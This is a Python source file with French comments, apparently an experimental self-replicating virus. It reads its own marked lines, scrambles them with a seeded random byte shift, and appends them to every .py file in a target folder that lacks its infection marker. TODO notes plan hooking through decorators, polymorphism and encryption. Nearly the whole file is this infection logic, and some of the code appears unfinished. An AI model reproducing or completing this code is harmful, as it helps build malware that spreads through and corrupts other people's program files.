# Les lignes suivantes ne doivent pas être copiées
# Les lignes suivantes ne doivent pas être copiées
# Les lignes suivantes ne doivent pas être copiées
# Les lignes suivantes ne doivent pas être copiées
#TODO:
# -Ajouter des variables pour les markers de lignes et de contagion
# -Utiliser le bytearray pour commencer le crypto
# -Voir comment se hooker à une fonction utilisée (avec un decorateur ;) )
# -Voir comment ajouter le polymorphisme + CRYPTO



# Import classique (à minimiser)
import glob #!::V::!#
import random #!
from string import * #!
# recherche des fichiers cibles à mettre en condition générale (si pas de fichiers ==> pas d'éxécution TODO)
files = glob.iglob('.\Target\*.py') #!
# Lecture des fichiers
with open(__file__, 'r') as source_file: #!
    source = source_file.readlines() #!
# on le place dans une matrice 2D rectangulaire
source_byte = [bytearray(b'#!::V::!#')]#!
line_max = 0 #!
for line in source:#!
    vstr = line.find('#!')#!
    if vstr!=-1:#!
        line_byte= bytearray(line[:vstr], 'utf-8')#!
        line_max = max(line_max, len(line_byte))#!
        source_byte.append(line_byte) #!
# Mise en forme + randomization
random.seed(17)#!
for line in source_byte:#!
    line.extend([35 for i in range(line_max - len(line))])#!
    for i in range(len(line)):#!
        line[i] = (line[i] + random.randrange(0,256))%256#!
# Création d'un fichier de debug
random.seed(17)
with open('Code.txt', 'w') as code_file:
    code_file.writelines(['\t'.join(map(str,i))+'\n' for i in source_byte])
    code_file.writelines([''.join(map(lambda x: chr((x - random.randrange(0,256))%256),i))+'\n' for i in source_byte])
for file in files: #!
    with open(file,'r') as victim: #!
        victim_read = victim.read() #!
    if victim_read.find('#!::V::!#') == -1: #!
        with open(file,'ab') as victim: #!
            victim.writelines(source_byte) #! TODO
# Les lignes suivantes ne doivent pas être copiées
# Les lignes suivantes ne doivent pas être copiées
# Les lignes suivantes ne doivent pas être copiées
# Les lignes suivantes ne doivent pas être copiées